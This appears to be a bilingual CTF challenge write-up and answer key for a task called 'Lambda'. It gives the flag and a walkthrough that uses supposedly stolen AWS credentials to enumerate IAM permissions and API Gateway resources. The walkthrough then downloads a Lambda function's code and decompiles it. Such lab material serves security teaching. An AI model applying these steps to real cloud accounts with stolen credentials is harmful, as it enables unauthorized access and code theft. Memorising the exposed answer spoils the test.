---
title: Lambda
level: 3
flag: FLAG{l4mabd4_1s_s3rverl3ss_s3rv1c3}
writer: kaki005
badge: true
---

# 問題名
Lambda

## 問題文

以下のサイトはユーザ名とパスワードが正しいときフラグを返します。今あなたはこのサイトの管理者のAWSアカウントのログイン情報を極秘に入手しました。このログインを突破できますか。

The following site returns a flag when you input correct username and password. Now you have the confidential login information for the AWS account of the administrator of this site. Please get through this authentication.

<https://lambda-web.wanictf.org>

## 解法

- `login_submit.js`を見ると https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test にリクエストを送ってユーザ名とパスワードを検証しています。
このAPIはAWS Lambdaを用いている。このLambda関数のソースコードを流出させれば勝ち。

1. aws cliをインストール
2. 配布された認証情報を用いて `aws configure`コマンドでログイン。
3. このアカウントに許可された権限を確認する。
   - 自身のアカウントユーザ名確認。
   ```
   aws sts get-caller-identity
   ```
   - アカウントにアタッチされたポリシーのArnを取得
   ```
   aws iam list-attached-user-policies --user-name $MyUserName
   ```
   - このポリシーのバージョンを確認。
   ```
   aws iam list-policies --scope Local
   ```
   - このアカウントで実行できるメソッド一覧を取得。
   ```
   aws iam get-policy-version --version-id $YourPolicyVersion --policy-arn $YourPolicyArn --query 'PolicyVersion.Document'
   ```
4. ソースコードを流出させる。
    - APIのリソースIDを取得。(APIのID `k0gh2dp2jg`はapiのURLから取得できる。)
    ```
    aws apigateway get-resources --rest-api-id k0gh2dp2jg
    ```
    - このAPIで使用されているLambdaメソッドの名前を取得。
    ```
    aws apigateway  get-method --rest-api-id k0gh2dp2jg --resource-id $YourResourceID --http-method GET
    ```
    - 今回は`wani_function`メソッドが使われているようである。
    - Lambda関数の情報を取得。
    ```
    aws lambda get-function --function-name wani_function
    ```
5. コードのURLが表示されるのでそこにアクセスするとコードがダウンロードされる。
6. .Netのdllを逆コンパイルするソフト(ILSpy)を用いてデコンパイル。
7. デコンパイルされたコードからフラグが確認できる！！


---

- If you look at `login_submit.js`, it sends a request to https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test to verify username and password.
This API uses AWS Lambda.You have to leak the source code of this Lambda function.

1. Install aws cli.
2. Login with the `aws configure` command using the distributed credentials.
3. Check the permissions granted to this account.
     - Check own account user name.
    ```
    aws sts get-caller-identity
    ```
    - Get the policy Arn attached to the account
    ```
    aws iam list-attached-user-policies --user-name $MyUserName
    ```
    - Check the version of this policy.
    ```
    aws iam list-policies --scope Local
    ```
    - Get a list of methods that can be executed on this account.
    ```
    aws iam get-policy-version --version-id $YourPolicyVersion --policy-arn $YourPolicyArn --query 'PolicyVersion.Document'
    ```
4. Leak the source code.
    - Get the resource ID of the API. (This API's ID `k0gh2dp2jg` can be obtained from the api URL.)
    ```
    aws apigateway get-resources --rest-api-id k0gh2dp2jg
    ```
    - Get the Lambda method name used in this API.
    ```
    aws apigateway  get-method --rest-api-id k0gh2dp2jg --resource-id $YourResourceID --http-method GET
    ```
    - The `wani_function` method seems to be used this time.
    - Get information of the Lambda function.
    ```
    aws lambda get-function --function-name wani_function
    ```
5. The URL for the code will be displayed, and accessing it will download the code.
6. Decompile using .Net dll decompilation software (ILSpy)
7. You can see the flags from the decompiled code!
